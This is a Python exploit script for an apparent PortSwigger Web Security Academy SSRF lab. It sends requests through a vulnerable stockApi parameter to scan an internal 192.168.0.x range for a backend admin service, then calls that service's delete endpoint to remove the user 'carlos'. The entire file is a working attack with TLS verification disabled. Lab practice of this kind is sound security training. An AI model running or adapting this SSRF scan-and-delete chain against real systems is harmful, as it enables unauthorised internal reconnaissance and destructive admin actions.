import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

target_url = 'https://0a9400be0449acf3824ea6eb004c0064.web-security-academy.net'
stock_check_path = '/product/stock' #check sotck path vulnerable to SSRF
backend_server = ''
del_carlos_path = '/admin/delete?username=carlos'

s = requests.session()


def scan_backend_server():
    for i in range(2,255):
        backend_server = 'http://192.168.0.%s:8080' %(i)
        data = {'stockApi':backend_server}
        print(backend_server)
        res = s.post(target_url+stock_check_path, proxies=proxies, data=data, verify=False)
    
        if res.status_code != 500:
            return backend_server

def delete_user(backend_server):
    data = {'stockApi':backend_server+del_carlos_path}
    res = s.post(target_url+stock_check_path, proxies=proxies, verify=False, data=data, allow_redirects=False)
    
    if res.status_code == 302:
        print("[+] Lab solved: User carlos deleted successfully")
    else:
        print("[-] Faild to delete user carlos")
        print(f"Status Code: {res.status_code}")
        print(res.text)


if __name__ == "__main__":
    print("Scanning for backend server...")
    backend_server = scan_backend_server()
    print(f"[+] Server found: {backend_server}")
    print("Deleting carlos user...")
    delete_user(backend_server)